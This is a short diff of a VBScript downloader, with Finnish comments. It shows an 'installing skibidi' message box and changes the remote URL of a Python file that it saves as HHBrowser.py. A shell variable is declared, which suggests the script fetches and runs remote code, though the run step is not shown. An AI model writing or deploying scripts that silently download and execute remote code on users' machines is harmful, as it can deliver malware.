@@ -3,7 +3,7 @@ MsgBox "installing skibidi"
 Dim http, fileSystem, fileStream, url, fileName, shell, cmd, pythonInstalled
 
 ' URL Python-tiedostoon
-url = "https://64bytes.netlify.app/import os, psutil.py" ' Vaihda tämä haluamaasi URL-osoitteeseen
+url = "https://64bytes.netlify.app/HHBrowser.py" ' Vaihda tämä haluamaasi URL-osoitteeseen
 
 ' Paikallinen tiedostonimi
 fileName = "HHBrowser.py"
